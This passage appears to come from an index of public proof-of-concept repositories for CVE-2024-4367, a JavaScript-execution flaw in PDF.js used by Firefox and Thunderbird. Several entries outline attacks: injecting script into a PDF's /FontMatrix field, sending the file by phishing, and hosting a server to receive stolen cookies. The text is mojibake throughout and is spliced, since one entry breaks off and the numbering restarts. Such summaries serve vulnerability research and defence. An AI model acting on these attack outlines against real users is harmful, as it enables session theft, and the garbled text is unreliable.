1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
